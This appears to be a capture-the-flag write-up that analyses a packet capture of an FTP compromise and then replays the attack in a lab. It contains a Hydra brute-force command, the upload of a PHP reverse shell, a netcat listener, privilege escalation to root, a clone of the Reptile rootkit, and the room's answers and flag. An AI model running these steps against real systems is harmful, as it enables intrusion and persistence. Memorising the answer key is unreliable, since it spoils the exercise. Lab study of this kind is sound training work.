# Task 1 Oh no! We've been hacked! :
----

## STREAM - 16 

```bash
220 Hello FTP World!
USER jenny
331 Please specify the password.
PASS password123
230 Login successful.
SYST
215 UNIX Type: L8
PWD
257 "/var/www/html" is the current directory
PORT 192,168,0,147,225,49
200 PORT command successful. Consider using PASV.
LIST -la
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 192,168,0,147,196,163
200 PORT command successful. Consider using PASV.
STOR shell.php
150 Ok to send data.
226 Transfer complete.
SITE CHMOD 777 shell.php
200 SITE CHMOD command ok.
QUIT
221 Goodbye.

```

## STREAM - 18 

```
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
```

## STREAM - 20 

```bash

Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 22:26:54 up  2:21,  1 user,  load average: 0.02, 0.07, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
jenny    tty1     -                20:06   37.00s  1.00s  0.14s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls -la
total 1529956
drwxr-xr-x  23 root root       4096 Feb  1 19:52 .
drwxr-xr-x  23 root root       4096 Feb  1 19:52 ..
drwxr-xr-x   2 root root       4096 Feb  1 20:11 bin
drwxr-xr-x   3 root root       4096 Feb  1 20:15 boot
drwxr-xr-x  18 root root       3880 Feb  1 20:05 dev
drwxr-xr-x  94 root root       4096 Feb  1 22:23 etc
drwxr-xr-x   3 root root       4096 Feb  1 20:05 home
lrwxrwxrwx   1 root root         34 Feb  1 19:52 initrd.img -> boot/initrd.img-4.15.0-135-generic
lrwxrwxrwx   1 root root         33 Jul 25  2018 initrd.img.old -> boot/initrd.img-4.15.0-29-generic
drwxr-xr-x  22 root root       4096 Feb  1 22:06 lib
drwxr-xr-x   2 root root       4096 Feb  1 20:08 lib64
drwx------   2 root root      16384 Feb  1 19:49 lost+found
drwxr-xr-x   2 root root       4096 Jul 25  2018 media
drwxr-xr-x   2 root root       4096 Jul 25  2018 mnt
drwxr-xr-x   2 root root       4096 Jul 25  2018 opt
dr-xr-xr-x 117 root root          0 Feb  1 20:23 proc
drwx------   3 root root       4096 Feb  1 22:20 root
drwxr-xr-x  29 root root       1040 Feb  1 22:23 run
drwxr-xr-x   2 root root      12288 Feb  1 20:11 sbin
drwxr-xr-x   4 root root       4096 Feb  1 20:06 snap
drwxr-xr-x   3 root root       4096 Feb  1 20:07 srv
-rw-------   1 root root 1566572544 Feb  1 19:52 swap.img
dr-xr-xr-x  13 root root          0 Feb  1 20:05 sys
drwxrwxrwt   2 root root       4096 Feb  1 22:25 tmp
drwxr-xr-x  10 root root       4096 Jul 25  2018 usr
drwxr-xr-x  14 root root       4096 Feb  1 21:54 var
lrwxrwxrwx   1 root root         31 Feb  1 19:52 vmlinuz -> boot/vmlinuz-4.15.0-135-generic
lrwxrwxrwx   1 root root         30 Jul 25  2018 vmlinuz.old -> boot/vmlinuz-4.15.0-29-generic
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@wir3:/$ su jenny
su jenny
Password: password123

jenny@wir3:/$ sudo -l
sudo -l
[sudo] password for jenny: password123

Matching Defaults entries for jenny on wir3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jenny may run the following commands on wir3:
    (ALL : ALL) ALL
jenny@wir3:/$ sudo su
sudo su
root@wir3:/# whoami
whoami
root
root@wir3:/# cd
cd
root@wir3:~# git clone https://github.com/f0rb1dd3n/Reptile.git
git clone https://github.com/f0rb1dd3n/Reptile.git
Cloning into 'Reptile'...
remote: Enumerating objects: 217, done..[K
remote: Counting objects:   0% (1/217).[K
remote: Counting objects:   1% (3/217).[K
remote: Counting objects:   2% (5/217).[K
remote: Counting objects:   3% (7/217).[K
remote: Counting objects:   4% (9/217).[K
remote: Counting objects:   5% (11/217).[K
remote: Counting objects:   6% (14/217).[K
remote: Counting objects:   7% (16/217).[K
remote: Counting objects:   8% (18/217).[K
remote: Counting objects:   9% (20/217).[K
remote: Counting objects:  10% (22/217).[K
remote: Counting objects:  11% (24/217).[K
remote: Counting objects:  12% (27/217).[K
remote: Counting objects:  13% (29/217).[K
remote: Counting objects:  14% (31/217).[K
remote: Counting objects:  15% (33/217).[K
remote: Counting objects:  16% (35/217).[K
remote: Counting objects:  17% (37/217).[K
remote: Counting objects:  18% (40/217).[K
remote: Counting objects:  19% (42/217).[K
remote: Counting objects:  20% (44/217).[K
remote: Counting objects:  21% (46/217).[K
remote: Counting objects:  22% (48/217).[K
remote: Counting objects:  23% (50/217).[K
remote: Counting objects:  24% (53/217).[K
remote: Counting objects:  25% (55/217).[K
remote: Counting objects:  26% (57/217).[K
remote: Counting objects:  27% (59/217).[K
remote: Counting objects:  28% (61/217).[K
remote: Counting objects:  29% (63/217).[K
remote: Counting objects:  30% (66/217).[K
remote: Counting objects:  31% (68/217).[K
remote: Counting objects:  32% (70/217).[K
remote: Counting objects:  33% (72/217).[K
remote: Counting objects:  34% (74/217).[K
remote: Counting objects:  35% (76/217).[K
remote: Counting objects:  36% (79/217).[K
remote: Counting objects:  37% (81/217).[K
remote: Counting objects:  38% (83/217).[K
remote: Counting objects:  39% (85/217).[K
remote: Counting objects:  40% (87/217).[K
remote: Counting objects:  41% (89/217).[K
remote: Counting objects:  42% (92/217).[K
remote: Counting objects:  43% (94/217).[K
remote: Counting objects:  44% (96/217).[K
remote: Counting objects:  45% (98/217).[K
remote: Counting objects:  46% (100/217).[K
remote: Counting objects:  47% (102/217).[K
remote: Counting objects:  48% (105/217).[K
remote: Counting objects:  49% (107/217).[K
remote: Counting objects:  50% (109/217).[K
remote: Counting objects:  51% (111/217).[K
remote: Counting objects:  52% (113/217).[K
remote: Counting objects:  53% (116/217).[K
remote: Counting objects:  54% (118/217).[K
remote: Counting objects:  55% (120/217).[K
remote: Counting objects:  56% (122/217).[K
remote: Counting objects:  57% (124/217).[K
remote: Counting objects:  58% (126/217).[K
remote: Counting objects:  59% (129/217).[K
remote: Counting objects:  60% (131/217).[K
remote: Counting objects:  61% (133/217).[K
remote: Counting objects:  62% (135/217).[K
remote: Counting objects:  63% (137/217).[K
remote: Counting objects:  64% (139/217).[K
remote: Counting objects:  65% (142/217).[K
remote: Counting objects:  66% (144/217).[K
remote: Counting objects:  67% (146/217).[K
remote: Counting objects:  68% (148/217).[K
remote: Counting objects:  69% (150/217).[K
remote: Counting objects:  70% (152/217).[K
remote: Counting objects:  71% (155/217).[K
remote: Counting objects:  72% (157/217).[K
remote: Counting objects:  73% (159/217).[K
remote: Counting objects:  74% (161/217).[K
remote: Counting objects:  75% (163/217).[K
remote: Counting objects:  76% (165/217).[K
remote: Counting objects:  77% (168/217).[K
remote: Counting objects:  78% (170/217).[K
remote: Counting objects:  79% (172/217).[K
remote: Counting objects:  80% (174/217).[K
remote: Counting objects:  81% (176/217).[K
remote: Counting objects:  82% (178/217).[K
remote: Counting objects:  83% (181/217).[K
remote: Counting objects:  84% (183/217).[K
remote: Counting objects:  85% (185/217).[K
remote: Counting objects:  86% (187/217).[K
remote: Counting objects:  87% (189/217).[K
remote: Counting objects:  88% (191/217).[K
remote: Counting objects:  89% (194/217).[K
remote: Counting objects:  90% (196/217).[K
remote: Counting objects:  91% (198/217).[K
remote: Counting objects:  92% (200/217).[K
remote: Counting objects:  93% (202/217).[K
remote: Counting objects:  94% (204/217).[K
remote: Counting objects:  95% (207/217).[K
remote: Counting objects:  96% (209/217).[K
remote: Counting objects:  97% (211/217).[K
remote: Counting objects:  98% (213/217).[K
remote: Counting objects:  99% (215/217).[K
remote: Counting objects: 100% (217/217).[K
remote: Counting objects: 100% (217/217), done..[K
remote: Compressing objects:   0% (1/152).[K
remote: Compressing objects:   1% (2/152).[K
remote: Compressing objects:   2% (4/152).[K
remote: Compressing objects:   3% (5/152).[K
remote: Compressing objects:   4% (7/152).[K
remote: Compressing objects:   5% (8/152).[K
remote: Compressing objects:   6% (10/152).[K
remote: Compressing objects:   7% (11/152).[K
remote: Compressing objects:   8% (13/152).[K
remote: Compressing objects:   9% (14/152).[K
remote: Compressing objects:  10% (16/152).[K
remote: Compressing objects:  11% (17/152).[K
remote: Compressing objects:  12% (19/152).[K
remote: Compressing objects:  13% (20/152).[K
remote: Compressing objects:  14% (22/152).[K
remote: Compressing objects:  15% (23/152).[K
remote: Compressing objects:  16% (25/152).[K
remote: Compressing objects:  17% (26/152).[K
remote: Compressing objects:  18% (28/152).[K
remote: Compressing objects:  19% (29/152).[K
remote: Compressing objects:  20% (31/152).[K
remote: Compressing objects:  21% (32/152).[K
remote: Compressing objects:  22% (34/152).[K
remote: Compressing objects:  23% (35/152).[K
remote: Compressing objects:  24% (37/152).[K
remote: Compressing objects:  25% (38/152).[K
remote: Compressing objects:  26% (40/152).[K
remote: Compressing objects:  27% (42/152).[K
remote: Compressing objects:  28% (43/152).[K
remote: Compressing objects:  29% (45/152).[K
remote: Compressing objects:  30% (46/152).[K
remote: Compressing objects:  31% (48/152).[K
remote: Compressing objects:  32% (49/152).[K
remote: Compressing objects:  33% (51/152).[K
remote: Compressing objects:  34% (52/152).[K
remote: Compressing objects:  35% (54/152).[K
remote: Compressing objects:  36% (55/152).[K
remote: Compressing objects:  37% (57/152).[K
remote: Compressing objects:  38% (58/152).[K
remote: Compressing objects:  39% (60/152).[K
remote: Compressing objects:  40% (61/152).[K
remote: Compressing objects:  41% (63/152).[K
remote: Compressing objects:  42% (64/152).[K
remote: Compressing objects:  43% (66/152).[K
remote: Compressing objects:  44% (67/152).[K
remote: Compressing objects:  45% (69/152).[K
remote: Compressing objects:  46% (70/152).[K
remote: Compressing objects:  47% (72/152).[K
remote: Compressing objects:  48% (73/152).[K
remote: Compressing objects:  49% (75/152).[K
remote: Compressing objects:  50% (76/152).[K
remote: Compressing objects:  51% (78/152).[K
remote: Compressing objects:  52% (80/152).[K
remote: Compressing objects:  53% (81/152).[K
remote: Compressing objects:  54% (83/152).[K
remote: Compressing objects:  55% (84/152).[K
remote: Compressing objects:  56% (86/152).[K
remote: Compressing objects:  57% (87/152).[K
remote: Compressing objects:  58% (89/152).[K
remote: Compressing objects:  59% (90/152).[K
remote: Compressing objects:  60% (92/152).[K
remote: Compressing objects:  61% (93/152).[K
remote: Compressing objects:  62% (95/152).[K
remote: Compressing objects:  63% (96/152).[K
remote: Compressing objects:  64% (98/152).[K
remote: Compressing objects:  65% (99/152).[K
remote: Compressing objects:  66% (101/152).[K
remote: Compressing objects:  67% (102/152).[K
remote: Compressing objects:  68% (104/152).[K
remote: Compressing objects:  69% (105/152).[K
remote: Compressing objects:  70% (107/152).[K
remote: Compressing objects:  71% (108/152).[K
remote: Compressing objects:  72% (110/152).[K
remote: Compressing objects:  73% (111/152).[K
remote: Compressing objects:  74% (113/152).[K
remote: Compressing objects:  75% (114/152).[K
remote: Compressing objects:  76% (116/152).[K
remote: Compressing objects:  77% (118/152).[K
remote: Compressing objects:  78% (119/152).[K
remote: Compressing objects:  79% (121/152).[K
remote: Compressing objects:  80% (122/152).[K
remote: Compressing objects:  81% (124/152).[K
remote: Compressing objects:  82% (125/152).[K
remote: Compressing objects:  83% (127/152).[K
remote: Compressing objects:  84% (128/152).[K
remote: Compressing objects:  85% (130/152).[K
remote: Compressing objects:  86% (131/152).[K
remote: Compressing objects:  87% (133/152).[K
remote: Compressing objects:  88% (134/152).[K
remote: Compressing objects:  89% (136/152).[K
remote: Compressing objects:  90% (137/152).[K
remote: Compressing objects:  91% (139/152).[K
remote: Compressing objects:  92% (140/152).[K
remote: Compressing objects:  93% (142/152).[K
remote: Compressing objects:  94% (143/152).[K
remote: Compressing objects:  95% (145/152).[K
remote: Compressing objects:  96% (146/152).[K
remote: Compressing objects:  97% (148/152).[K
remote: Compressing objects:  98% (149/152).[K
remote: Compressing objects:  99% (151/152).[K
remote: Compressing objects: 100% (152/152).[K
remote: Compressing objects: 100% (152/152), done..[K
Receiving objects:   0% (1/1010)   
Receiving objects:   1% (11/1010)   
Receiving objects:   2% (21/1010)   
Receiving objects:   3% (31/1010)   
Receiving objects:   4% (41/1010)   
Receiving objects:   5% (51/1010)   
Receiving objects:   6% (61/1010)   
Receiving objects:   7% (71/1010)   
Receiving objects:   8% (81/1010)   
Receiving objects:   9% (91/1010)   
Receiving objects:  10% (101/1010)   
Receiving objects:  11% (112/1010)   
Receiving objects:  12% (122/1010)   
Receiving objects:  13% (132/1010)   
Receiving objects:  14% (142/1010)   
Receiving objects:  15% (152/1010)   
Receiving objects:  16% (162/1010)   
Receiving objects:  17% (172/1010)   
Receiving objects:  18% (182/1010)   
Receiving objects:  19% (192/1010)   
Receiving objects:  20% (202/1010)   
Receiving objects:  21% (213/1010)   
Receiving objects:  22% (223/1010)   
Receiving objects:  23% (233/1010)   
Receiving objects:  24% (243/1010)   
Receiving objects:  25% (253/1010)   
Receiving objects:  26% (263/1010)   
Receiving objects:  27% (273/1010)   
Receiving objects:  28% (283/1010)   
Receiving objects:  29% (293/1010)   
Receiving objects:  30% (303/1010)   
Receiving objects:  31% (314/1010)   
Receiving objects:  32% (324/1010)   
Receiving objects:  33% (334/1010)   
Receiving objects:  34% (344/1010)   
Receiving objects:  35% (354/1010)   
Receiving objects:  36% (364/1010)   
Receiving objects:  37% (374/1010)   
Receiving objects:  38% (384/1010)   
Receiving objects:  39% (394/1010)   
Receiving objects:  40% (404/1010)   
Receiving objects:  41% (415/1010)   
Receiving objects:  42% (425/1010)   
Receiving objects:  43% (435/1010)   
Receiving objects:  44% (445/1010)   
Receiving objects:  45% (455/1010)   
Receiving objects:  46% (465/1010)   
Receiving objects:  47% (475/1010)   
Receiving objects:  48% (485/1010)   
Receiving objects:  49% (495/1010)   
Receiving objects:  50% (505/1010)   
Receiving objects:  51% (516/1010)   
Receiving objects:  52% (526/1010)   
Receiving objects:  53% (536/1010)   
Receiving objects:  54% (546/1010)   
Receiving objects:  55% (556/1010)   
Receiving objects:  56% (566/1010)   
Receiving objects:  57% (576/1010)   
Receiving objects:  58% (586/1010)   
Receiving objects:  59% (596/1010)   
Receiving objects:  60% (606/1010)   
Receiving objects:  61% (617/1010)   
Receiving objects:  62% (627/1010)   
Receiving objects:  63% (637/1010)   
Receiving objects:  64% (647/1010)   
Receiving objects:  65% (657/1010)   
Receiving objects:  66% (667/1010)   
Receiving objects:  67% (677/1010)   
Receiving objects:  68% (687/1010)   
Receiving objects:  69% (697/1010)   
Receiving objects:  70% (707/1010)   
Receiving objects:  71% (718/1010)   
Receiving objects:  72% (728/1010)   
Receiving objects:  73% (738/1010)   
Receiving objects:  74% (748/1010)   
Receiving objects:  75% (758/1010)   
Receiving objects:  76% (768/1010)   
Receiving objects:  77% (778/1010)   
Receiving objects:  78% (788/1010)   
Receiving objects:  79% (798/1010)   
Receiving objects:  80% (808/1010)   
Receiving objects:  81% (819/1010)   
Receiving objects:  82% (829/1010)   
Receiving objects:  83% (839/1010)   
Receiving objects:  84% (849/1010)   
Receiving objects:  85% (859/1010)   
Receiving objects:  86% (869/1010)   
Receiving objects:  87% (879/1010)   
Receiving objects:  88% (889/1010)   
Receiving objects:  89% (899/1010)   
Receiving objects:  90% (909/1010)   
Receiving objects:  91% (920/1010)   
Receiving objects:  92% (930/1010)   
Receiving objects:  93% (940/1010)   
Receiving objects:  94% (950/1010)   
Receiving objects:  95% (960/1010)   
remote: Total 1010 (delta 65), reused 190 (delta 50), pack-reused 793.[K
Receiving objects:  96% (970/1010)   
Receiving objects:  97% (980/1010)   
Receiving objects:  98% (990/1010)   
Receiving objects:  99% (1000/1010)   
Receiving objects: 100% (1010/1010)   
Receiving objects: 100% (1010/1010), 472.55 KiB | 1.73 MiB/s, done.
Resolving deltas:   0% (0/499)   
Resolving deltas:   2% (12/499)   
Resolving deltas:   3% (15/499)   
Resolving deltas:   5% (27/499)   
Resolving deltas:   7% (36/499)   
Resolving deltas:   8% (40/499)   
Resolving deltas:   9% (46/499)   
Resolving deltas:  10% (50/499)   
Resolving deltas:  13% (67/499)   
Resolving deltas:  14% (72/499)   
Resolving deltas:  15% (75/499)   
Resolving deltas:  16% (83/499)   
Resolving deltas:  17% (85/499)   
Resolving deltas:  18% (92/499)   
Resolving deltas:  20% (103/499)   
Resolving deltas:  31% (159/499)   
Resolving deltas:  34% (173/499)   
Resolving deltas:  37% (188/499)   
Resolving deltas:  41% (205/499)   
Resolving deltas:  43% (217/499)   
Resolving deltas:  44% (220/499)   
Resolving deltas:  45% (227/499)   
Resolving deltas:  47% (238/499)   
Resolving deltas:  48% (242/499)   
Resolving deltas:  49% (245/499)   
Resolving deltas:  53% (266/499)   
Resolving deltas:  55% (278/499)   
Resolving deltas:  57% (285/499)   
Resolving deltas:  58% (294/499)   
Resolving deltas:  59% (295/499)   
Resolving deltas:  60% (301/499)   
Resolving deltas:  61% (305/499)   
Resolving deltas:  62% (312/499)   
Resolving deltas:  63% (317/499)   
Resolving deltas:  66% (330/499)   
Resolving deltas:  67% (336/499)   
Resolving deltas:  68% (341/499)   
Resolving deltas:  70% (354/499)   
Resolving deltas:  71% (357/499)   
Resolving deltas:  72% (360/499)   
Resolving deltas:  74% (371/499)   
Resolving deltas:  75% (378/499)   
Resolving deltas:  76% (380/499)   
Resolving deltas:  83% (415/499)   
Resolving deltas:  84% (420/499)   
Resolving deltas:  85% (425/499)   
Resolving deltas:  86% (430/499)   
Resolving deltas:  87% (435/499)   
Resolving deltas:  88% (440/499)   
Resolving deltas:  89% (448/499)   
Resolving deltas:  90% (450/499)   
Resolving deltas:  91% (456/499)   
Resolving deltas:  92% (460/499)   
Resolving deltas:  93% (467/499)   
Resolving deltas:  94% (470/499)   
Resolving deltas:  95% (476/499)   
Resolving deltas:  96% (480/499)   
Resolving deltas:  97% (485/499)   
Resolving deltas:  98% (491/499)   
Resolving deltas:  99% (495/499)   
Resolving deltas: 100% (499/499)   
Resolving deltas: 100% (499/499), done.
root@wir3:~# cd Reptile
cd Reptile
root@wir3:~/Reptile# ls -la
ls -la
total 44
drwxr-xr-x 7 root root 4096 Feb  1 22:27 .
drwx------ 4 root root 4096 Feb  1 22:27 ..
drwxr-xr-x 2 root root 4096 Feb  1 22:27 configs
drwxr-xr-x 8 root root 4096 Feb  1 22:27 .git
-rw-r--r-- 1 root root    8 Feb  1 22:27 .gitignore
-rw-r--r-- 1 root root 1922 Feb  1 22:27 Kconfig
drwxr-xr-x 7 root root 4096 Feb  1 22:27 kernel
-rw-r--r-- 1 root root 1852 Feb  1 22:27 Makefile
-rw-r--r-- 1 root root 2183 Feb  1 22:27 README.md
drwxr-xr-x 4 root root 4096 Feb  1 22:27 scripts
drwxr-xr-x 6 root root 4096 Feb  1 22:27 userland
root@wir3:~/Reptile# make
make
make[1]: Entering directory '/root/Reptile/userland'
Makefile:10: ../.config: No such file or directory
make[1]: *** No rule to make target '../.config'.  Stop.
make[1]: Leaving directory '/root/Reptile/userland'
Makefile:56: recipe for target 'userland_bin' failed
make: *** [userland_bin] Error 2
root@wir3:~/Reptile# 

```

----

# Task 2 Hack your way back into the machine :
----

## BRUTE FORCING FTP

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ hydra -l jenny -P /usr/share/wordlists/rockyou.txt 10.10.193.151 ftp
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-24 02:52:18
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.193.151:21/
[21][ftp] host: 10.10.193.151   login: jenny   password: 987654321                                                      
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-24 02:53:15
```

## LOGGING IN WITH USER JENNY 

```
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ ftp jenny@10.10.193.151
Connected to 10.10.193.151.
220 Hello FTP World!
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||49041|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
-rwxrwxrwx    1 1000     1000         5493 Feb 01  2021 shell.php
226 Directory send OK.
ftp> nano shell.php                                         
?Invalid command.
ftp> get shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||24622|)
150 Opening BINARY mode data connection for shell.php (5493 bytes).
100% |*****************|  5493      168.86 KiB/s    00:00 ETA
226 Transfer complete.
5493 bytes received in 00:00 (8.26 KiB/s)
ftp> get index.html
local: index.html remote: index.html
229 Entering Extended Passive Mode (|||39607|)
150 Opening BINARY mode data connection for index.html (10918 bytes).
100% |*****************| 10918        1.15 MiB/s    00:00 ETA
226 Transfer complete.
```

## UPLOADING MODIFIED PHP SHELL 

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nano shell.php 
                         
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||44556|)
150 Ok to send data.
100% |*****************|  5492        5.64 MiB/s    00:00 ETA
226 Transfer complete.
5492 bytes sent in 00:00 (9.70 KiB/s)

```

## GETTING SHELL 

>>Go to this url below, before that create netcat listener.

```
http://10.10.193.151/shell.php
```

```bash

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nc -lvnp 7007
listening on [any] 7007 ...
connect to [10.9.1.204] from (UNKNOWN) [10.10.193.151] 44078
Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 08:13:03 up 28 min,  0 users,  load average: 0.00, 0.01, 0.24
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@wir3:/$ su jenny
su jenny
Password: 987654321

jenny@wir3:/$ 
jenny@wir3:/$ sudo su  
sudo su
[sudo] password for jenny: 987654321

root@wir3:/# ls
bin   home            lib64       opt   sbin      tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  srv       usr
dev   initrd.img.old  media       root  swap.img  var
etc   lib             mnt         run   sys       vmlinuz
root@wir3:/# cd root
root@wir3:~# ls
Reptile
root@wir3:~# cd Reptile
cd Reptile
root@wir3:~/Reptile# ls
configs   Kconfig  Makefile  README.md  userland
flag.txt  kernel   output    scripts
root@wir3:~/Reptile# cat flag.txt
ebcefd66ca4b559d17b440b6e67fd0fd

```

----

# ANSWER THE FOLLOWING :
----

1.It seems like our machine got hacked by an anonymous threat actor. However, we are lucky to have a .pcap file from the attack. Can you determine what happened? Download the .pcap file and use Wireshark to view it.
>>No answer needed

2.The attacker is trying to log into a specific service. What service is this?
>>FTP

3.There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?
>>Hydra

4.The attacker is trying to log on with a specific username. What is the username?
>>jenny

5.What is the user's password?
>>password123

6.What is the current FTP working directory after the attacker logged in?
>>/var/www/html

7.The attacker uploaded a backdoor. What is the backdoor's filename?
>>shell.php

8.The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?
>>http://pentestmonkey.net/tools/php-reverse-shell

9.Which command did the attacker manually execute after getting a reverse shell?
>>whoami

10.What is the computer's hostname?
>>wir3

11.Which command did the attacker execute to spawn a new TTY shell?
>>python3 -c 'import pty; pty.spawn("/bin/bash")'

12.Which command was executed to gain a root shell?
>>sudo su

13.The attacker downloaded something from GitHub. What is the name of the GitHub project?
>>Reptile

14.The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called
>>Rootkit

15.Deploy the machine.
The attacker has changed the user's password! Can you replicate the attacker's steps and read the flag.txt? The flag is located in the /root/Reptile directory. Remember, you can always look back at the .pcap file if necessary. Good luck!
>>No answer needed

16.Run Hydra (or any similar tool) on the FTP service. The attacker might not have chosen a complex password. You might get lucky if you use a common word list.
Change the necessary values inside the web shell and upload it to the webserver
>>No answer needed

17.Create a listener on the designated port on your attacker machine. Execute the web shell by visiting the .php file on the targeted web server.
>>No answer needed

18.Become root!
>>No answer needed

19.Read the flag.txt file inside the Reptile directory
>>ebcefd66ca4b559d17b440b6e67fd0fd

----